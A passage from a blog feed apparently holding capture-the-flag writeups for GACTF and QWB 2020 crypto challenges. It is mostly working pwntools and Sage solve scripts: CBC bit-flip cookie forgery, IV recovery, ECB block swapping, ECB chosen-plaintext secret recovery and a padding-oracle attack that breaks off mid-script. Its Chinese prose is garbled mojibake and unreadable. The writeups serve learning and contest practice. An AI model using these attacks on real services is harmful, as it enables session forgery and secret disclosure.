title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.158.89"</span>, <span class="string">"8888"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"md5\(str \+ (.*)\)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest()[:<span class="number">5</span>] ==</span><br><span class="line">                        cipher, string.ascii_lowercase + string.digits, length=<span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me xxxxx: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># a(n+3) = 195*(a(n+2) - a(n+1)) + a(n)</span></span><br><span class="line">    data = [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">195</span>, <span class="number">337</span>), (<span class="number">37829</span>, <span class="number">65521</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>):</span><br><span class="line">        y = <span class="number">195</span> * (data[<span class="number">-1</span>][<span class="number">1</span>] - data[<span class="number">-2</span>][<span class="number">1</span>]) + data[<span class="number">-3</span>][<span class="number">1</span>]</span><br><span class="line">        x = int(iroot(((y + <span class="number">1</span>) * (<span class="number">2</span> * y + <span class="number">1</span>)) // <span class="number">6</span>, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        data.append((x, y))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] x: "</span>, str(data[i][<span class="number">0</span>]))</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] y: "</span>, str(data[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">send_data()</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">You are right!</span></span><br><span class="line"><span class="string">flag is: gactf&#123;congrts_you_solve_it&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><h4 id="é¢˜è§£åˆ†æ-5"><a href="#é¢˜è§£åˆ†æ-5" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>å®Œå…¨å‡ºåŸé¢˜å¯è¿˜è¡Œï¼Œç”šè‡³péƒ½ä¸€æ ·</p><p><a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html" target="_blank" rel="noopener">https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html</a></p><p>åŸºç‚¹gï¼Œå•¥æç¤ºæ²¡æœ‰ï¼ŒåŸé¢˜ä¹Ÿæ˜¯å±‘é¢˜ï¼Œç›²çŒœ$x_{g}^{2}+y_{g}^{2}=1(mod\ p)$ï¼Œç”±add functionå¯çŸ¥ï¼š</p><script type="math/tex; mode=display">(x,y) => x^2+y^2\\(x^2-y^2,2xy) => x^4-2x^2y^2+y^4+4x^2y^2=x^4+2x^2y^2+y^4=(x^2+y^2)^2</script><p>ä¹Ÿå°±æ˜¯è¯´åœ¨gä¸ºåŸºç‚¹æ—¶ï¼Œmutiplyå¾—åˆ°çš„æ•´ä¸ªåŸŸä¸Šå‡æ»¡è¶³$x^{2}+y^{2}\equiv 1(mod\ p)$</p><p>ç»™å‡ºä¸¤ä¸ªç‚¹A,Bï¼Œåˆ©ç”¨$gcd(x_{A}^{2}+y_{A}^{2}-1,x_{B}^{2}+y_{B}^{2}-1)$å¾—åˆ°p</p><p>å¾—åˆ°påï¼Œæƒ³è¦å¾—åˆ°<code>shared = multiply(A, b)[0]</code></p><p>ç”±äºå‰è¿°ç‚¹é›†çš„é€šé¡¹å’Œadd functionï¼Œå¯å°†å…¶è¡¨ç¤ºä¸ºå•ä½âšªä¸Šçš„ç‚¹</p><p>sageå¯¹æŸä¸ªåŸŸå­˜åœ¨<code>extend</code>å‡½æ•°ï¼Œå‚æ•°å¯ä¼ å…¥ä¸€ä¸ªpolynomialï¼Œä½œç”¨å¤§æ¦‚å°±æ˜¯å°†è¿™ä¸ªåŸŸå¼•å…¥è¯¥polynomialå¯¹åº”çš„æ‰€æœ‰æ ¹ï¼ˆåŒ…æ‹¬è™šæ ¹ï¼‰ï¼Œå†é‡æ–°å½¢æˆç¯çš„å®šä¹‰åè¿”å›ä¸€ä¸ª<strong>æ‰©å±•åŸŸ</strong>ï¼ˆå’Œå…ˆå‰çš„å•†ç¯quotientä¸åŒï¼‰</p><p>å› æ­¤ç”¨è¯¥æ‰©å±•åŸŸè¡¨ç¤ºå•ä½åœ†ä¸Šçš„ç‚¹ï¼Œæ±‚è§£DLPå³å¯å¾—åˆ°bï¼Œè¿›è€Œè·å¾—share</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">A = (<span class="number">68279847973010227567437241690876400434176575735647388141445319082120661</span>, <span class="number">36521392659318312718307506287199839545959127964141955928297920414981390</span>)</span><br><span class="line">B = (<span class="number">84698630137710906531637499064120297563999383201108850561060383338482806</span>, <span class="number">10975400339031190591877824767290004140780471215800442883565278903964109</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = GCD(A[<span class="number">0</span>]^<span class="number">2</span>+A[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>, B[<span class="number">0</span>]^<span class="number">2</span>+B[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>)</span><br><span class="line">factor(p)</span><br><span class="line"><span class="comment"># 2^2 * 108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line">g = (<span class="number">29223879291878505213325643878338189297997503744039619988987863719655098</span>, <span class="number">32188620669315455017576071518169599806490004123869726364682284676721556</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_points</span><span class="params">(P, Q)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((P[<span class="number">0</span>]*Q[<span class="number">0</span>]-P[<span class="number">1</span>]*Q[<span class="number">1</span>]) % p, (P[<span class="number">0</span>]*Q[<span class="number">1</span>]+P[<span class="number">1</span>]*Q[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(P, n)</span>:</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add_points(Q, P)</span><br><span class="line">        P = add_points(P, P)</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">R.&lt;w&gt; = PolynomialRing(F)</span><br><span class="line">K.&lt;w&gt; = F.extension(w^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">g_K = g[<span class="number">0</span>] + g[<span class="number">1</span>]*w</span><br><span class="line">B_K = B[<span class="number">0</span>] + B[<span class="number">1</span>]*w</span><br><span class="line">b = discrete_log(B_K, g_K)</span><br><span class="line">print(b)</span><br><span class="line">print(multiply(g, b) == B)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">42167952593276919058888649873311585235839247920808784925745017581061391</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">shared = multiply(A, b)[<span class="number">0</span>]</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = aes.decrypt(bytes.fromhex(<span class="string">"26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431"</span>))</span><br><span class="line">print(plaintext)</span><br><span class="line"><span class="comment"># b'gactf&#123;354b6ce4c03387a828a3c30061213204&#125;\t\t\t\t\t\t\t\t\t'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(å¼ºç½‘æ¯2020) - Crypto</title>
      <link href="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/"/>
      <url>/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="modestudy"><a href="#modestudy" class="headerlink" title="modestudy"></a>modestudy</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>qwbç»å…¸studyç³»åˆ—ï¼ˆå¥—å¨ƒ</p><ul><li><p>Challenge-1: AES/CBCå­—èŠ‚ç¿»è½¬</p></li><li><p>Challenge-2: AES/CBC Encrypt Oracleï¼ˆiv fixedï¼‰ï¼Œå‘é€<code>b&#39;\x00&#39;*32</code>ï¼Œå³å¯è¿˜åŸiv</p></li><li><p>Challenge-3: ECBï¼Œå°†ç¬¬ä¸‰ç»„cipheræ¢ä¸ºç¬¬äº”ç»„cipherå³å¯</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/image-20200824134157397.png" alt></p></li><li><p>Challenge-4: ECBé€‰æ‹©æ˜æ–‡æ”»å‡» ($E_{k}(pt||salt)$)ï¼Œè‡³å¤š256*len(salt)æ¬¡å³å¯æ¢å¤salt</p><p>(ç”±äºè®¿é—®é¢‘ç‡é™åˆ¶é—®é¢˜ï¼Œåœ¨çˆ†ç ´å•ä¸ªsaltæ¯”ç‰¹ä½æ—¶ï¼Œå®œå°†256ç»„æ‹¼æ¥ï¼Œåœ¨ä¸€æ¬¡ä¸­è¯·æ±‚åŠ å¯†)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">    ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br></pre></td></tr></table></figure></li><li><p>Challenge-5: é€šè¿‡æŠ¥é”™å‘ç°<code>assert(len(pt) % 2 == 0)</code>ï¼Œå› æ­¤<code>myblockencrypt_ecb</code>æ˜¯ä¸ªåˆ†ç»„é•¿åº¦ä»…ä¸º2bytesçš„ECBï¼Œçˆ†ç ´å³å¯ï¼ˆåŒæ ·ç”±äºé¢‘ç‡é™åˆ¶ï¼Œå®œæ‹¼æ¥ä¸€æ¬¡æ€§å‘é€ï¼Œæ‰“è¡¨æœ¬åœ°æŸ¥æ‰¾ï¼‰</p></li><li><p>Challenge-6: Padding Oracle Attackï¼ˆcrack_rangeä¸ºç¬¬ä¸€å—ï¼Œä¸”IVå¯æ§ï¼‰</p></li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re, random</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify, hexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"139.224.254.172"</span>, <span class="string">"7777"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    prefix = re.findall(<span class="string">r"\((.*)\+"</span>,msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        answer = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>))</span><br><span class="line">        cipher = sha256((prefix + answer).encode()).digest()</span><br><span class="line">        <span class="keyword">if</span> cipher[<span class="number">0</span>] &lt; <span class="number">8</span>:</span><br><span class="line">            io.sendlineafter(<span class="string">"?="</span>, answer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken="</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal1</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie:"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    cookie = re.findall(<span class="string">r"^(.*);checksum=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    session, checksum = cookie[<span class="number">0</span>], cookie[<span class="number">1</span>]</span><br><span class="line">    session = session.encode()</span><br><span class="line">    checksum = unhexlify(checksum)</span><br><span class="line">    payload = session[<span class="number">-16</span>:<span class="number">-1</span>] + <span class="string">b'1'</span></span><br><span class="line">    checksum = hexlify(xor(xor(payload, checksum[<span class="number">-32</span>:<span class="number">-16</span>]), session[<span class="number">-16</span>:]) + checksum[<span class="number">-16</span>:]).decode()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] cookie:"</span>, session[:<span class="number">-1</span>].decode() + <span class="string">"1;checksum="</span> + checksum)</span><br><span class="line">    print(<span class="string">"[+] challenge-1 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal2</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv_hash = re.findall(<span class="string">r"\(iv\)=(.*)"</span>, msg)[<span class="number">0</span>] <span class="comment"># sha256(iv).hexdigest()</span></span><br><span class="line">    <span class="comment"># ct = hexlify(b'\x00' * 32).decode()</span></span><br><span class="line">    ct = <span class="string">b'\x00'</span> * <span class="number">32</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] c:"</span>, ct)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    pt = re.findall(<span class="string">r"\[\+\] (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    pt = unhexlify(pt)</span><br><span class="line">    iv = xor(pt[:<span class="number">16</span>], pt[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">assert</span>(sha256(iv).hexdigest() == iv_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] iv(encode hex):"</span>, hexlify(iv))</span><br><span class="line">    print(<span class="string">"[+] challenge-2 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal3</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie="</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    cookie = io.recvline().strip()</span></span><br><span class="line"><span class="string">    for i in range(0, len(cookie), 16):</span></span><br><span class="line"><span class="string">        print(cookie[i:i+16])</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    io.recvuntil(<span class="string">"[+] 128bit_ecb_encrypt(cookie):"</span>)</span><br><span class="line">    cookie = unhexlify(io.recvline().strip())</span><br><span class="line">    cookie = cookie[:<span class="number">16</span>*<span class="number">2</span>] + cookie[<span class="number">16</span>*<span class="number">4</span>:<span class="number">16</span>*<span class="number">5</span>] + cookie[<span class="number">16</span>*<span class="number">3</span>:]</span><br><span class="line">    cookie = hexlify(cookie)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your encrypted cookie(encode hex):"</span>, cookie)</span><br><span class="line">    print(<span class="string">"[+] challenge-3 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] encrypted msg: "</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>)):</span><br><span class="line">        prefix = <span class="string">b"\x00"</span> * i</span><br><span class="line">        cipher = chal4_enc(prefix)[:<span class="number">16</span>]</span><br><span class="line">        mt = <span class="string">b""</span></span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">        ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ct[<span class="number">16</span>*lsb:<span class="number">16</span>*(lsb+<span class="number">1</span>)] == cipher:</span><br><span class="line">                secret += bytes([lsb])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-4 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(your_input).encode(\"hex\"):"</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"5"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(secret).encode(\"hex\")="</span>)</span><br><span class="line">    secret_cipher = unhexlify(io.recvline().strip())</span><br><span class="line">    mt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">        mt += int.to_bytes(i, <span class="number">2</span>, <span class="string">"big"</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    ct = chal5_enc(mt)</span><br><span class="line">    secret_list = [ct[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>)]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(secret_cipher), <span class="number">2</span>):</span><br><span class="line">        cur_secret = secret_list.index(secret_cipher[i:i+<span class="number">2</span>])</span><br><span class="line">        secret += int.to_bytes(cur_secret, <span class="number">2</span>, <span class="string">'big'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-5 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6_dec</span><span class="params">(c)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your iv+c (encode hex):"</span>, hexlify(c))</span><br><span class="line">    resp = io.recvline().strip().decode()</span><br><span class="line">    <span 